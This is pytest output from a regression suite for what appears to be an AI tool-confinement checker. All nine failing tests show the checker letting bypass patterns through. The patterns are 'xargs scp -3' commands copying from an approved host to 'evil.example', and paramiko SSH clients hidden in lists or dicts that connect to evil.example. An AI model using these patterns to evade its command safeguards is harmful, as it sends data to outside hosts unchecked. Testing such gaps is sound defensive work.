FFFFFFFFF.                                                               [100%]
=================================== FAILURES ===================================
_ test_xargs_unknown_operands_fail_closed[printf 'evil.example:/dest' | xargs scp -3 -F none approved.example:/source] _
/evidence/round12_regressions.py:13: in test_xargs_unknown_operands_fail_closed
    assert check_ssh_command_access(command,'round12') is not None
E   assert None is not None
E    +  where None = check_ssh_command_access("printf 'evil.example:/dest' | xargs scp -3 -F none approved.example:/source", 'round12')
_ test_xargs_unknown_operands_fail_closed[printf 'evil.example:/dest' | xargs env scp -3 -F none approved.example:/source] _
/evidence/round12_regressions.py:13: in test_xargs_unknown_operands_fail_closed
    assert check_ssh_command_access(command,'round12') is not None
E   assert None is not None
E    +  where None = check_ssh_command_access("printf 'evil.example:/dest' | xargs env scp -3 -F none approved.example:/source", 'round12')
_ test_xargs_unknown_operands_fail_closed[find . -exec xargs scp -3 -F none approved.example:/source {} +] _
/evidence/round12_regressions.py:13: in test_xargs_unknown_operands_fail_closed
    assert check_ssh_command_access(command,'round12') is not None
E   AssertionError: assert None is not None
E    +  where None = check_ssh_command_access('find . -exec xargs scp -3 -F none approved.example:/source {} +', 'round12')
_ test_container_clients_require_approval[clients=[paramiko.SSHClient()]-clients[0]] _
/evidence/round12_regressions.py:24: in test_container_clients_require_approval
    assert _check_code_safety(code,session_id='round12') is not None
E   assert None is not None
E    +  where None = _check_code_safety("import paramiko; clients=[paramiko.SSHClient()]; clients[0].connect(hostname='evil.example')", session_id='round12')
_ test_container_clients_require_approval[clients={'server':paramiko.SSHClient()}-clients['server']] _
/evidence/round12_regressions.py:24: in test_container_clients_require_approval
    assert _check_code_safety(code,session_id='round12') is not None
E   assert None is not None
E    +  where None = _check_code_safety("import paramiko; clients={'server':paramiko.SSHClient()}; clients['server'].connect(hostname='evil.example')", session_id='round12')
_ test_container_clients_require_approval[clients=[paramiko.SSHClient()]; c=clients[0]-c] _
/evidence/round12_regressions.py:24: in test_container_clients_require_approval
    assert _check_code_safety(code,session_id='round12') is not None
E   assert None is not None
E    +  where None = _check_code_safety("import paramiko; clients=[paramiko.SSHClient()]; c=clients[0]; c.connect(hostname='evil.example')", session_id='round12')
_ test_container_clients_require_approval[clients=[paramiko.SSHClient()]-clients[-1]] _
/evidence/round12_regressions.py:24: in test_container_clients_require_approval
    assert _check_code_safety(code,session_id='round12') is not None
E   assert None is not None
E    +  where None = _check_code_safety("import paramiko; clients=[paramiko.SSHClient()]; clients[-1].connect(hostname='evil.example')", session_id='round12')
_ test_unresolved_container_clients_fail_closed[index=0; clients=[paramiko.SSHClient()]-clients[index]] _
/evidence/round12_regressions.py:33: in test_unresolved_container_clients_fail_closed
    assert _check_code_safety(code,session_id='round12') is not None
E   assert None is not None
E    +  where None = _check_code_safety("import paramiko; index=0; clients=[paramiko.SSHClient()]; clients[index].connect(hostname='evil.example')", session_id='round12')
_ test_unresolved_container_clients_fail_closed[index=0; clients=[paramiko.SSHClient()]; c=clients[index]-c] _
/evidence/round12_regressions.py:33: in test_unresolved_container_clients_fail_closed
    assert _check_code_safety(code,session_id='round12') is not None
E   assert None is not None
E    +  where None = _check_code_safety("import paramiko; index=0; clients=[paramiko.SSHClient()]; c=clients[index]; c.connect(hostname='evil.example')", session_id='round12')
=============================== warnings summary ===============================
studio/backend/core/inference/tool_confinement.py:262
  /work/studio/backend/core/inference/tool_confinement.py:262: DeprecationWarning: Due to '_pack_', the '_PathBeneathAttr' Structure will use memory layout compatible with MSVC (Windows). If this is intended, set _layout_ to 'ms'. The implicit default is deprecated and slated to become an error in Python 3.19.
    class _PathBeneathAttr(ctypes.Structure):

-- Docs: https://docs.pytest.org/en/stable/how-to/capture-warnings.html
=========================== short test summary info ============================
FAILED ../evidence/round12_regressions.py::test_xargs_unknown_operands_fail_closed[printf 'evil.example:/dest' | xargs scp -3 -F none approved.example:/source]
FAILED ../evidence/round12_regressions.py::test_xargs_unknown_operands_fail_closed[printf 'evil.example:/dest' | xargs env scp -3 -F none approved.example:/source]
FAILED ../evidence/round12_regressions.py::test_xargs_unknown_operands_fail_closed[find . -exec xargs scp -3 -F none approved.example:/source {} +]
FAILED ../evidence/round12_regressions.py::test_container_clients_require_approval[clients=[paramiko.SSHClient()]-clients[0]]
FAILED ../evidence/round12_regressions.py::test_container_clients_require_approval[clients={'server':paramiko.SSHClient()}-clients['server']]
FAILED ../evidence/round12_regressions.py::test_container_clients_require_approval[clients=[paramiko.SSHClient()]; c=clients[0]-c]
FAILED ../evidence/round12_regressions.py::test_container_clients_require_approval[clients=[paramiko.SSHClient()]-clients[-1]]
FAILED ../evidence/round12_regressions.py::test_unresolved_container_clients_fail_closed[index=0; clients=[paramiko.SSHClient()]-clients[index]]
FAILED ../evidence/round12_regressions.py::test_unresolved_container_clients_fail_closed[index=0; clients=[paramiko.SSHClient()]; c=clients[index]-c]
9 failed, 1 passed, 1 warning in 0.14s
